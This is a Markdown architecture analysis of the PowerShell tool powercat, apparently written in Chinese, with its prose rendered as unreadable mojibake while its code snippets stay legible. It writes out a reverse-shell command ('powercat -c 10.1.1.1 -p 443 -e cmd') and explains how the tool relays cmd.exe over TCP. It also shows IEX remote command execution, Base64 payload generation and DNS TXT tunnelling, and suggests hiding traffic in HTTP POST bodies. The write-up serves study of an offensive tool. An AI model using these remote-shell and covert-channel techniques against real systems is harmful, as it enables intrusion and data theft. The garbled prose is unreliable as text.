# Powercat æŠ€æœ¯æ¶æ„æ·±å…¥åˆ†æ

## ç›®å½•
1. [ä»£ç ç»“æ„æ€»è§ˆ](#ä»£ç ç»“æ„æ€»è§ˆ)
2. [æ ¸å¿ƒè®¾è®¡æ¨¡å¼](#æ ¸å¿ƒè®¾è®¡æ¨¡å¼)
3. [å‡½æ•°è°ƒç”¨æµç¨‹](#å‡½æ•°è°ƒç”¨æµç¨‹)
4. [ç½‘ç»œåè®®å®ç°](#ç½‘ç»œåè®®å®ç°)
5. [æ•°æ®æµå¤„ç†æœºåˆ¶](#æ•°æ®æµå¤„ç†æœºåˆ¶)
6. [å…³é”®ä»£ç ç‰‡æ®µè§£æ](#å…³é”®ä»£ç ç‰‡æ®µè§£æ)
7. [æ€§èƒ½ä¼˜åŒ–ç‚¹](#æ€§èƒ½ä¼˜åŒ–ç‚¹)
8. [æ½œåœ¨æ”¹è¿›æ–¹å‘](#æ½œåœ¨æ”¹è¿›æ–¹å‘)

---

## ä»£ç ç»“æ„æ€»è§ˆ

### æ–‡ä»¶ç»„æˆ
```
powercat.ps1 (949 è¡Œ)
â”œâ”€â”€ å‚æ•°å®šä¹‰ (1-22 è¡Œ)
â”œâ”€â”€ å¸®åŠ©ä¿¡æ¯ (24-122 è¡Œ)
â”œâ”€â”€ å‚æ•°éªŒè¯ (124-149 è¡Œ)
â”œâ”€â”€ UDP å‡½æ•°ç»„ (151-245 è¡Œ)
â”œâ”€â”€ DNS å‡½æ•°ç»„ (247-424 è¡Œ)
â”œâ”€â”€ TCP å‡½æ•°ç»„ (426-533 è¡Œ)
â”œâ”€â”€ CMD å‡½æ•°ç»„ (535-588 è¡Œ)
â”œâ”€â”€ PowerShell å‡½æ•° (590-688 è¡Œ)
â”œâ”€â”€ Console å‡½æ•°ç»„ (690-729 è¡Œ)
â”œâ”€â”€ Main ä¸»å‡½æ•° (731-817 è¡Œ)
â”œâ”€â”€ Payload ç”Ÿæˆå™¨ (819-914 è¡Œ)
â””â”€â”€ æ‰§è¡Œé€»è¾‘ (921-948 è¡Œ)
```

### ä»£ç è¡Œæ•°ç»Ÿè®¡
- **æ€»è¡Œæ•°**: 949
- **å‡½æ•°å®šä¹‰**: ~600 è¡Œï¼ˆ63%ï¼‰
- **ä¸»é€»è¾‘**: ~200 è¡Œï¼ˆ21%ï¼‰
- **å¸®åŠ©/éªŒè¯**: ~150 è¡Œï¼ˆ16%ï¼‰

---

## æ ¸å¿ƒè®¾è®¡æ¨¡å¼

### 1. ç­–ç•¥æ¨¡å¼ (Strategy Pattern)

Powercat ä¸ºä¸åŒçš„ç½‘ç»œåè®®å’Œåº”ç”¨å±‚å®ç°äº†ç»Ÿä¸€çš„æ¥å£ï¼š

```
æ¥å£ï¼ˆæ¦‚å¿µä¸Šçš„ï¼‰:
- Setup()      â†’ å»ºç«‹è¿æ¥
- ReadData()   â†’ è¯»å–æ•°æ®
- WriteData()  â†’ å†™å…¥æ•°æ®
- Close()      â†’ å…³é—­è¿æ¥

å®ç°ï¼š
- TCP:     Setup_TCP,     ReadData_TCP,     WriteData_TCP,     Close_TCP
- UDP:     Setup_UDP,     ReadData_UDP,     WriteData_UDP,     Close_UDP
- DNS:     Setup_DNS,     ReadData_DNS,     WriteData_DNS,     Close_DNS
- CMD:     Setup_CMD,     ReadData_CMD,     WriteData_CMD,     Close_CMD
- Console: Setup_Console, ReadData_Console, WriteData_Console, Close_Console
```

**ä¼˜åŠ¿**:
- æ˜“äºæ‰©å±•æ–°åè®®
- ä»£ç å¤ç”¨æ€§é«˜
- ç»Ÿä¸€çš„è°ƒç”¨æ¥å£

### 2. åŒå‘ä¸­ç»§æ¨¡å¼

```
Stream1 (ç½‘ç»œå±‚) â†” Main Loop â†” Stream2 (åº”ç”¨å±‚)
```

ä¸»å¾ªç¯å®ç°ï¼š
```powershell
while($True)
{
    # Stream2 â†’ Stream1
    $Data = Stream2_ReadData
    Stream1_WriteData $Data
    
    # Stream1 â†’ Stream2
    $Data = Stream1_ReadData
    Stream2_WriteData $Data
}
```

### 3. å‡½æ•°å¼ç¼–ç¨‹

Payload ç”Ÿæˆå™¨ä½¿ç”¨å‡½æ•°ä½œä¸ºä¸€ç­‰å…¬æ°‘ï¼š
```powershell
$FuncVars["Create_SYN"] = ${function:Create_SYN}
# åç»­è°ƒç”¨
Invoke-Command $FuncVars["Create_SYN"] -ArgumentList @(...)
```

---

## å‡½æ•°è°ƒç”¨æµç¨‹

### å®Œæ•´æ‰§è¡Œæµç¨‹å›¾

```
ç”¨æˆ·æ‰§è¡Œ powercat -c 10.1.1.1 -p 443 -e cmd
    â†“
1. å‚æ•°è§£æå’ŒéªŒè¯
    â†“
2. ç¡®å®š Stream ç±»å‹
    - Stream1: TCP (å› ä¸ºæ²¡æœ‰ -u æˆ– -dns)
    - Stream2: CMD (å› ä¸ºæœ‰ -e cmd)
    â†“
3. æ„å»ºå‡½æ•°å­—ç¬¦ä¸²
    $FunctionString = "
        function Stream1_Setup { ... }
        function Stream1_ReadData { ... }
        function Stream1_WriteData { ... }
        function Stream1_Close { ... }
        function Stream2_Setup { ... }
        function Stream2_ReadData { ... }
        function Stream2_WriteData { ... }
        function Stream2_Close { ... }
        function Main { ... }
    "
    â†“
4. æ„å»ºè°ƒç”¨å­—ç¬¦ä¸²
    $InvokeString = "Main @('10.1.1.1',$False,443,60) @('cmd')"
    â†“
5. ç»„åˆå¹¶æ‰§è¡Œ
    IEX ($FunctionString + $InvokeString)
    â†“
6. Main å‡½æ•°æ‰§è¡Œ
    â”œâ”€â”€ Stream1_Setup â†’ TCP è¿æ¥åˆ° 10.1.1.1:443
    â”œâ”€â”€ Stream2_Setup â†’ å¯åŠ¨ cmd.exe è¿›ç¨‹
    â””â”€â”€ ä¸»å¾ªç¯
        â”œâ”€â”€ Stream2_ReadData â†’ è¯»å– cmd è¾“å‡º
        â”œâ”€â”€ Stream1_WriteData â†’ å‘é€åˆ°ç½‘ç»œ
        â”œâ”€â”€ Stream1_ReadData â†’ ä»ç½‘ç»œè¯»å–
        â””â”€â”€ Stream2_WriteData â†’ å†™å…¥ cmd è¾“å…¥
```

### å‚æ•°éªŒè¯æµç¨‹

```powershell
# 1. æ£€æŸ¥äº’æ–¥å‚æ•°
if(-c å’Œ -l åŒæ—¶å­˜åœ¨ æˆ– éƒ½ä¸å­˜åœ¨) â†’ é”™è¯¯
if(-e, -ep, -r å¤šä¸ªåŒæ—¶å­˜åœ¨) â†’ é”™è¯¯

# 2. æ£€æŸ¥ç«¯å£å ç”¨
if(-l æˆ– -r ç›‘å¬æ¨¡å¼)
    netstat æ£€æŸ¥ç«¯å£æ˜¯å¦å·²è¢«å ç”¨

# 3. è®¾ç½®é»˜è®¤å€¼
if(-of å­˜åœ¨) â†’ $o = 'Bytes'
```

---

## ç½‘ç»œåè®®å®ç°

### TCP å®ç°ç»†èŠ‚

#### å®¢æˆ·ç«¯æ¨¡å¼
```powershell
$Socket = New-Object System.Net.Sockets.TcpClient
$Handle = $Socket.BeginConnect($c, $p, $null, $null)  # å¼‚æ­¥è¿æ¥

# ç­‰å¾…è¿æ¥å®Œæˆæˆ–è¶…æ—¶
while($True) {
    if($Handle.IsCompleted) {
        $Socket.EndConnect($Handle)
        $Stream = $Socket.GetStream()
        break
    }
    if(è¶…æ—¶) { break }
}
```

#### æœåŠ¡ç«¯æ¨¡å¼
```powershell
$Socket = New-Object System.Net.Sockets.TcpListener $p
$Socket.Start()
$Handle = $Socket.BeginAcceptTcpClient($null, $null)  # å¼‚æ­¥ç­‰å¾…è¿æ¥

while($True) {
    if($Handle.IsCompleted) {
        $Client = $Socket.EndAcceptTcpClient($Handle)
        $Stream = $Client.GetStream()
        break
    }
}
```

#### å¼‚æ­¥ I/O
```powershell
# å¼€å§‹å¼‚æ­¥è¯»å–
$ReadOperation = $Stream.BeginRead($Buffer, 0, $BufferSize, $null, $null)

# æ£€æŸ¥æ˜¯å¦å®Œæˆ
if($ReadOperation.IsCompleted) {
    $BytesRead = $Stream.EndRead($ReadOperation)
    $Data = $Buffer[0..($BytesRead-1)]
    # ç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡è¯»å–
    $ReadOperation = $Stream.BeginRead(...)
}
```

**å…³é”®ç‚¹**ï¼š
- ä½¿ç”¨ `Begin*/End*` æ¨¡å¼å®ç°å¼‚æ­¥ I/O
- éé˜»å¡ï¼Œå¯ä»¥åœ¨ç­‰å¾…æ—¶æ£€æµ‹é”®ç›˜è¾“å…¥
- è¯»å–åç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡å¼‚æ­¥è¯»å–

### UDP å®ç°ç»†èŠ‚

#### æœåŠ¡ç«¯ç‰¹æ®Šå¤„ç†
```powershell
# UDP ç›‘å¬éœ€è¦ç­‰å¾…ç¬¬ä¸€ä¸ªæ•°æ®åŒ…
$EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
$ConnectHandle = $Socket.BeginReceiveMessageFrom(...)

# æ¥æ”¶ç¬¬ä¸€ä¸ªåŒ…åï¼Œè®°å½•å®¢æˆ·ç«¯åœ°å€
$Socket.EndReceiveMessageFrom($ConnectHandle, [ref]$EndPoint, ...)
# ç°åœ¨ $EndPoint åŒ…å«äº†å®¢æˆ·ç«¯çš„ IP å’Œç«¯å£
```

**UDP çš„æŒ‘æˆ˜**ï¼š
- æ— è¿æ¥ï¼Œä¸çŸ¥é“å¯¹ç«¯åœ°å€
- è§£å†³æ–¹æ¡ˆï¼šæœåŠ¡ç«¯ç­‰å¾…ç¬¬ä¸€ä¸ªæ•°æ®åŒ…æ¥ç¡®å®šå®¢æˆ·ç«¯åœ°å€

### DNS åè®®å®ç°

#### DNSCat2 åè®®æ¦‚è¿°
```
1. ä¼šè¯å»ºç«‹ (SYN)
   å®¢æˆ·ç«¯: <tag><random>00<sessionId><seqNum>0000<domain>
   æœåŠ¡ç«¯: è¿”å›ç¡®è®¤

2. æ•°æ®ä¼ è¾“ (MSG)
   å®¢æˆ·ç«¯: <tag><random>01<sessionId><seqNum><ackNum><data><domain>
   æœåŠ¡ç«¯: è¿”å›æ•°æ®å’Œæ–°çš„ ack/seq

3. ä¼šè¯å…³é—­ (FIN)
   å®¢æˆ·ç«¯: <tag><random>02<sessionId>00<domain>
```

#### æ•°æ®ç¼–ç æµç¨‹
```powershell
# 1. å­—ç¬¦ä¸² â†’ åå…­è¿›åˆ¶æ•°ç»„
"Hello" â†’ ["48","65","6c","6c","6f"]

# 2. åˆ†æ®µæ‰“åŒ…ï¼ˆæ¯30å­—ç¬¦ä¸€æ®µï¼Œå— DNS æ ‡ç­¾é™åˆ¶ï¼‰
["48","65","6c","6c","6f","20","57","6f","72","6c","64"]
â†’ "48656c6c6f20576f726c64"
â†’ "48656c6c6f20576f726c64.example.com"

# 3. å‘é€ DNS TXT æŸ¥è¯¢
nslookup -type=TXT 48656c6c6f20576f726c64.example.com
```

#### åºåˆ—å·å’Œç¡®è®¤å·
```powershell
# åˆå§‹åŒ–
$SessionId = Random(1000-9999)
$SeqNum = Random(1000-9999)

# æ¥æ”¶æ•°æ®åæ›´æ–° AckNum
$AckNum = ($AckNum + $ReceivedDataLength) % 65535

# å“åº”ä¸­è·å–æ–°çš„ SeqNum
$SeqNum = $DecodedPacket[3]
```

#### å¤±è´¥å¤„ç†æœºåˆ¶
```powershell
$Failures = 0
$FailureThreshold = 10  # é»˜è®¤

# æ¯æ¬¡å¤±è´¥
if(é”™è¯¯) {
    $Failures++
    continue  # è·³è¿‡è¿™ä¸ªåŒ…ï¼Œå°è¯•ä¸‹ä¸€ä¸ª
}

# å¤±è´¥è¿‡å¤šåˆ™é€€å‡º
if($Failures >= $FailureThreshold) { break }
```

---

## æ•°æ®æµå¤„ç†æœºåˆ¶

### å­—èŠ‚æ•°ç»„å¤„ç†

```powershell
# åˆ›å»ºç¼“å†²åŒº
$Buffer = New-Object System.Byte[] 65536

# è¯»å–éƒ¨åˆ†æ•°æ®
$BytesRead = $Stream.Read($Buffer, 0, 65536)

# æå–æœ‰æ•ˆæ•°æ®
$Data = $Buffer[0..($BytesRead-1)]

# åˆå¹¶æ•°æ®
$AllData += $Data
```

### ç¼–ç è½¬æ¢

```powershell
$Encoding = New-Object System.Text.AsciiEncoding

# å­—ç¬¦ä¸² â†’ å­—èŠ‚
$Bytes = $Encoding.GetBytes("Hello")

# å­—èŠ‚ â†’ å­—ç¬¦ä¸²
$String = $Encoding.GetString($Bytes)
```

### æ–‡ä»¶è¯»å†™

```powershell
# è¯»å–æ–‡ä»¶
if(Test-Path $i) {
    $InputToWrite = [io.file]::ReadAllBytes($i)
}

# å†™å…¥æ–‡ä»¶
[io.file]::WriteAllBytes($of, $OutputBytes)
```

---

## å…³é”®ä»£ç ç‰‡æ®µè§£æ

### 1. è¶…æ—¶å’Œé”®ç›˜ä¸­æ–­å¤„ç†

```powershell
$Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
while($True)
{
    # æ£€æµ‹ CTRL æˆ– ESC é”®
    if($Host.UI.RawUI.KeyAvailable)
    {
        $Key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp")
        if(@(17,27) -contains $Key.VirtualKeyCode)  # 17=CTRL, 27=ESC
        {
            # æ¸…ç†å¹¶é€€å‡º
            break
        }
    }
    
    # æ£€æµ‹è¶…æ—¶
    if($Stopwatch.Elapsed.TotalSeconds -gt $t)
    {
        Write-Verbose "Timeout!"
        break
    }
    
    # æ£€æµ‹è¿æ¥å®Œæˆ
    if($Handle.IsCompleted)
    {
        # å¤„ç†è¿æ¥
        break
    }
}
$Stopwatch.Stop()
```

**æŠ€æœ¯ç‚¹**ï¼š
- `Stopwatch` ç±»ç”¨äºç²¾ç¡®è®¡æ—¶
- `RawUI.KeyAvailable` éé˜»å¡æ£€æµ‹é”®ç›˜è¾“å…¥
- è™šæ‹Ÿé”®ç  17 (CTRL) å’Œ 27 (ESC)

### 2. DNS æŸ¥è¯¢å°è£…

```powershell
function SendPacket
{
    param($Packet, $DNSServer, $DNSPort)
    
    # æ„å»º nslookup å‘½ä»¤
    $Command = @"
set type=TXT
server $DNSServer
set port=$DNSPort
set domain=.com
set retry=1
$Packet
exit
"@
    
    # æ‰§è¡Œå¹¶æ•è·è¾“å‡º
    $result = ($Command | nslookup 2>&1 | Out-String)
    
    # æå– TXT è®°å½•å†…å®¹ï¼ˆåœ¨å¼•å·ä¹‹é—´ï¼‰
    if($result.Contains('"')) {
        return ([regex]::Match($result.replace("bio=",""), '(?<=")[^"]*(?=")').Value)
    }
    else {
        return 1  # å¤±è´¥
    }
}
```

**æŠ€å·§**ï¼š
- Here-String (`@"..."@`) æ„å»ºå¤šè¡Œå‘½ä»¤
- ç®¡é“è¾“å…¥åˆ° `nslookup`
- æ­£åˆ™è¡¨è¾¾å¼æå–å¼•å·å†…å®¹ï¼š`'(?<=")[^"]*(?=")'`
  - `(?<=")` - æ­£å‘åæŸ¥æ‰¾ï¼ŒåŒ¹é…å¼•å·åçš„ä½ç½®
  - `[^"]*` - åŒ¹é…éå¼•å·å­—ç¬¦
  - `(?=")` - æ­£å‘å‰æŸ¥æ‰¾ï¼ŒåŒ¹é…å¼•å·å‰çš„ä½ç½®

### 3. PowerShell ä¼šè¯å®ç°

```powershell
while($True)
{
    # æ‰§è¡Œå‘½ä»¤
    if($CommandToExecute -ne "")
    {
        try {
            # IEX = Invoke-Expressionï¼Œæ‰§è¡Œå­—ç¬¦ä¸²ä½œä¸ºä»£ç 
            $ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))
        }
        catch {
            $ReturnedData = $Encoding.GetBytes(($_ | Out-String))
        }
        $Prompt = $Encoding.GetBytes(("PS " + (pwd).Path + "> "))
    }
    
    # å‘é€è¾“å‡ºå’Œæç¤ºç¬¦
    $Data = $IntroPrompt + $ReturnedData + $Prompt
    Stream1_WriteData $Data
    
    # è¯»å–ä¸‹ä¸€ä¸ªå‘½ä»¤
    $Data = Stream1_ReadData
    $CommandToExecute = $Encoding.GetString($Data)
}
```

**å…³é”®**ï¼š
- `IEX` æ‰§è¡Œä»»æ„ PowerShell ä»£ç 
- `2>&1` é‡å®šå‘é”™è¯¯åˆ°æ ‡å‡†è¾“å‡º
- `| Out-String` å°†è¾“å‡ºè½¬ä¸ºå­—ç¬¦ä¸²
- åŠ¨æ€ç”Ÿæˆæç¤ºç¬¦ `PS C:\Users\...>`

### 4. Payload ç”ŸæˆæŠ€å·§

```powershell
# è·å–å‡½æ•°å®šä¹‰ä½œä¸ºå­—ç¬¦ä¸²
$FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")

# ${function:FunctionName} è¿”å›å‡½æ•°ä½“çš„å­—ç¬¦ä¸²è¡¨ç¤º

# æœ€ç»ˆç”Ÿæˆçš„ä»£ç ï¼š
function Stream1_Setup
{
    param($FuncSetupVars)
    # ... Setup_TCP çš„å®Œæ•´ä»£ç  ...
}
```

**æŠ€æœ¯**ï¼š
- PowerShell çš„ `${function:Name}` è¯­æ³•è·å–å‡½æ•°å®šä¹‰
- å­—ç¬¦ä¸²æ‹¼æ¥æ„å»ºå®Œæ•´è„šæœ¬
- Base64 ç¼–ç ï¼š`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Script))`

### 5. è¿›ç¨‹å¯åŠ¨å’Œé‡å®šå‘

```powershell
$ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
$ProcessStartInfo.FileName = "cmd.exe"
$ProcessStartInfo.UseShellExecute = $False          # ä¸ä½¿ç”¨ Shell
$ProcessStartInfo.RedirectStandardInput = $True     # é‡å®šå‘è¾“å…¥
$ProcessStartInfo.RedirectStandardOutput = $True    # é‡å®šå‘è¾“å‡º
$ProcessStartInfo.RedirectStandardError = $True     # é‡å®šå‘é”™è¯¯

$Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)

# å¼‚æ­¥è¯»å–è¾“å‡º
$StdOutReadOp = $Process.StandardOutput.BaseStream.BeginRead(...)
$StdErrReadOp = $Process.StandardError.BaseStream.BeginRead(...)

# å†™å…¥è¾“å…¥
$Process.StandardInput.WriteLine($Command)
```

---

## æ€§èƒ½ä¼˜åŒ–ç‚¹

### 1. å¼‚æ­¥ I/O
- **ä¼˜åŠ¿**: é¿å…é˜»å¡ï¼Œæé«˜å“åº”æ€§
- **å®ç°**: `Begin*/End*` æ¨¡å¼
- **æ•ˆæœ**: CPU åˆ©ç”¨ç‡ä½ï¼Œå¯åŒæ—¶å¤„ç†å¤šä¸ªæµ

### 2. ç¼“å†²åŒºå¤§å°
```powershell
# TCP: ä½¿ç”¨ Socket çš„æ¥æ”¶ç¼“å†²åŒºå¤§å°
$BufferSize = $Socket.ReceiveBufferSize  # é€šå¸¸æ˜¯ 8192-65536

# UDP/CMD: å›ºå®š 65536 å­—èŠ‚
$Buffer = New-Object System.Byte[] 65536
```

### 3. ç¡çœ ç­–ç•¥
```powershell
# æ— æ•°æ®æ—¶çŸ­æš‚ç¡çœ ï¼Œé¿å… CPU ç©ºè½¬
if($Data.Length -eq 0) {
    Start-Sleep -Milliseconds 100
}
```

### 4. DNS æ‰¹é‡å¤„ç†
```powershell
# å°†æ•°æ®åˆ†æ®µä¸ºå¤šä¸ª DNS åŒ…
$PacketsData = @()
foreach($Char in $Hex) {
    if($PacketCount -ge $MaxMSGDataSize) {
        $PacketsData += $PacketData
        $PacketData = ""
    }
    $PacketData += $Char
}

# æ‰¹é‡å‘é€
foreach($PacketData in $PacketsData) {
    SendPacket $PacketData
}
```

---

## æ½œåœ¨æ”¹è¿›æ–¹å‘

### 1. å®‰å…¨å¢å¼º

#### æ·»åŠ åŠ å¯†
```powershell
# åœ¨ WriteData ä¸­åŠ å¯†
function WriteData_TCP_Encrypted
{
    param($Data, $FuncVars)
    
    # ä½¿ç”¨ AES åŠ å¯†
    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Key = $FuncVars["EncryptionKey"]
    $AES.IV = $FuncVars["IV"]
    $Encryptor = $AES.CreateEncryptor()
    
    $EncryptedData = $Encryptor.TransformFinalBlock($Data, 0, $Data.Length)
    
    $FuncVars["Stream"].Write($EncryptedData, 0, $EncryptedData.Length)
    return $FuncVars
}
```

#### æ·»åŠ èº«ä»½éªŒè¯
```powershell
# åœ¨ Setup åè¿›è¡Œæ¡æ‰‹
$Challenge = Generate-RandomBytes 16
Stream1_WriteData $Challenge

$Response = Stream1_ReadData
if($Response -ne (Compute-HMAC $Challenge $SharedSecret)) {
    throw "Authentication failed"
}
```

### 2. åŠŸèƒ½æ‰©å±•

#### æ”¯æŒ SOCKS ä»£ç†
```powershell
function Setup_SOCKS
{
    # å®ç° SOCKS5 åè®®
    # 1. æ¡æ‰‹
    # 2. è®¤è¯
    # 3. è¿æ¥è¯·æ±‚
    # 4. ä¸­ç»§æ•°æ®
}
```

#### æ”¯æŒ HTTP/HTTPS
```powershell
function Setup_HTTP
{
    # ä½¿ç”¨ HTTP è¯·æ±‚éšè—é€šä¿¡
    $WebRequest = [System.Net.WebRequest]::Create("http://server/")
    $WebRequest.Method = "POST"
    # æ•°æ®éšè—åœ¨ POST è¯·æ±‚ä½“ä¸­
}
```

### 3. æ€§èƒ½æå‡

#### å¤šçº¿ç¨‹å¤„ç†
```powershell
# ä½¿ç”¨ Runspace å®ç°çœŸæ­£çš„å¹¶å‘
$RunspacePool = [runspacefactory]::CreateRunspacePool(1, 5)
$RunspacePool.Open()

$PowerShell = [powershell]::Create()
$PowerShell.RunspacePool = $RunspacePool
$PowerShell.AddScript({Stream1_ReadData})
$AsyncResult = $PowerShell.BeginInvoke()
```

#### å‹ç¼©æ•°æ®
```powershell
function Compress-Data
{
    param($Data)
    $MS = New-Object System.IO.MemoryStream
    $GZip = New-Object System.IO.Compression.GZipStream($MS, [System.IO.Compression.CompressionMode]::Compress)
    $GZip.Write($Data, 0, $Data.Length)
    $GZip.Close()
    return $MS.ToArray()
}
```

### 4. å¯é æ€§æ”¹è¿›

#### é‡è¿æœºåˆ¶
```powershell
function Setup_TCP_WithRetry
{
    $MaxRetries = 3
    $RetryCount = 0
    
    while($RetryCount -lt $MaxRetries) {
        try {
            return Setup_TCP $Vars
        }
        catch {
            $RetryCount++
            Start-Sleep -Seconds 5
        }
    }
    throw "Connection failed after $MaxRetries attempts"
}
```

#### å¿ƒè·³æ£€æµ‹
```powershell
# å®šæœŸå‘é€å¿ƒè·³åŒ…
$LastHeartbeat = Get-Date
if(((Get-Date) - $LastHeartbeat).TotalSeconds -gt 30) {
    Stream1_WriteData @(0xFF, 0xFF)  # å¿ƒè·³æ ‡è®°
    $LastHeartbeat = Get-Date
}
```

### 5. è°ƒè¯•å’Œæ—¥å¿—

#### è¯¦ç»†æ—¥å¿—
```powershell
function Log-Message
{
    param($Level, $Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] [$Level] $Message"
    
    Add-Content -Path "powercat.log" -Value $LogEntry
    
    if($global:Verbose -or $Level -eq "ERROR") {
        Write-Host $LogEntry
    }
}

# ä½¿ç”¨
Log-Message "INFO" "Connection established to $c:$p"
Log-Message "ERROR" "Failed to read data: $($_.Exception.Message)"
```

#### æµé‡ç»Ÿè®¡
```powershell
$Stats = @{
    "BytesSent" = 0
    "BytesReceived" = 0
    "StartTime" = Get-Date
}

# åœ¨ WriteData ä¸­
$Stats["BytesSent"] += $Data.Length

# åœ¨ ReadData ä¸­
$Stats["BytesReceived"] += $Data.Length

# æ˜¾ç¤ºç»Ÿè®¡
$Duration = ((Get-Date) - $Stats["StartTime"]).TotalSeconds
Write-Host "Sent: $($Stats['BytesSent']) bytes, Received: $($Stats['BytesReceived']) bytes"
Write-Host "Duration: $Duration seconds"
Write-Host "Speed: $($Stats['BytesReceived'] / $Duration) bytes/sec"
```

---

## ä»£ç è´¨é‡åˆ†æ

### ä¼˜ç‚¹
1. âœ… **æ¨¡å—åŒ–è®¾è®¡** - åŠŸèƒ½åˆ†ç¦»æ¸…æ™°
2. âœ… **ç»Ÿä¸€æ¥å£** - æ‰€æœ‰åè®®ä½¿ç”¨ç›¸åŒçš„å‡½æ•°ç­¾å
3. âœ… **å¼‚æ­¥ I/O** - éé˜»å¡æ“ä½œ
4. âœ… **é”™è¯¯å¤„ç†** - try/catch å—å’ŒéªŒè¯
5. âœ… **çµæ´»æ€§** - æ”¯æŒå¤šç§åè®®å’Œæ¨¡å¼

### å¯æ”¹è¿›ç‚¹
1. âš ï¸ **æ— åŠ å¯†** - æ˜æ–‡ä¼ è¾“æ•°æ®
2. âš ï¸ **æ— è®¤è¯** - ä»»ä½•äººéƒ½å¯ä»¥è¿æ¥
3. âš ï¸ **ç¡¬ç¼–ç å€¼** - ç¼“å†²åŒºå¤§å°ç­‰å‚æ•°å›ºå®š
4. âš ï¸ **æœ‰é™çš„é”™è¯¯ä¿¡æ¯** - æŸäº›é”™è¯¯åªè¿”å›ç®€å•æ¶ˆæ¯
5. âš ï¸ **DNS ä¾èµ– nslookup** - å¤–éƒ¨å·¥å…·ä¾èµ–

### å®‰å…¨è€ƒè™‘
- ğŸ”’ ä»…åœ¨æˆæƒç¯å¢ƒä½¿ç”¨
- ğŸ”’ è€ƒè™‘æ·»åŠ è®¿é—®æ§åˆ¶åˆ—è¡¨
- ğŸ”’ å®ç°æµé‡åŠ å¯†
- ğŸ”’ è®°å½•æ‰€æœ‰è¿æ¥å°è¯•

---

## å­¦ä¹ è¦ç‚¹

### PowerShell æŠ€å·§
1. **å‡½æ•°ä½œä¸ºå€¼**: `${function:Name}`
2. **å¼‚æ­¥æ¨¡å¼**: `Begin*/End*`
3. **åŠ¨æ€æ‰§è¡Œ**: `IEX` å’Œ `Invoke-Command`
4. **ç±»å‹åŠ é€Ÿå™¨**: `[System.Net.Sockets.TcpClient]`
5. **ç®¡é“**: æ•°æ®æµå¤„ç†

### ç½‘ç»œç¼–ç¨‹
1. **Socket ç¼–ç¨‹**: TCP/UDP çš„åŒºåˆ«
2. **å¼‚æ­¥ I/O**: æé«˜æ€§èƒ½
3. **åè®®å®ç°**: DNSã€TCP æ¡æ‰‹
4. **æ•°æ®ç¼–ç **: å­—èŠ‚æ•°ç»„å¤„ç†

### ç³»ç»Ÿç¼–ç¨‹
1. **è¿›ç¨‹ç®¡ç†**: å¯åŠ¨å’Œæ§åˆ¶è¿›ç¨‹
2. **æµé‡å®šå‘**: æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯
3. **å¹¶å‘å¤„ç†**: å¤šä¸ªå¼‚æ­¥æ“ä½œ

---

## æ€»ç»“

Powercat æ˜¯ä¸€ä¸ªç²¾å¿ƒè®¾è®¡çš„ç½‘ç»œå·¥å…·ï¼Œå±•ç¤ºäº†ï¼š
- **ä¼˜ç§€çš„æ¶æ„** - æ¨¡å—åŒ–ã€å¯æ‰©å±•
- **å®ç”¨çš„åŠŸèƒ½** - TCP/UDP/DNS å¤šåè®®æ”¯æŒ
- **å·§å¦™çš„å®ç°** - å¼‚æ­¥ I/Oã€åŠ¨æ€ä»£ç ç”Ÿæˆ
- **å­¦ä¹ ä»·å€¼** - PowerShell å’Œç½‘ç»œç¼–ç¨‹çš„æœ€ä½³å®è·µ

é€šè¿‡æ·±å…¥ç†è§£å…¶å®ç°ï¼Œä½ å¯ä»¥ï¼š
1. å­¦ä¹  PowerShell é«˜çº§ç‰¹æ€§
2. ç†è§£ç½‘ç»œåè®®åº•å±‚å®ç°
3. æŒæ¡å¼‚æ­¥ç¼–ç¨‹æ¨¡å¼
4. å¼€å‘è‡ªå·±çš„ç½‘ç»œå·¥å…·

å»ºè®®è¿›ä¸€æ­¥å­¦ä¹ ï¼š
- .NET ç½‘ç»œç¼–ç¨‹ API
- å¼‚æ­¥ç¼–ç¨‹æ¨¡å¼ (APM/TAP)
- ç½‘ç»œåè®®æ ‡å‡† (RFC)
- PowerShell è„šæœ¬æœ€ä½³å®è·µ
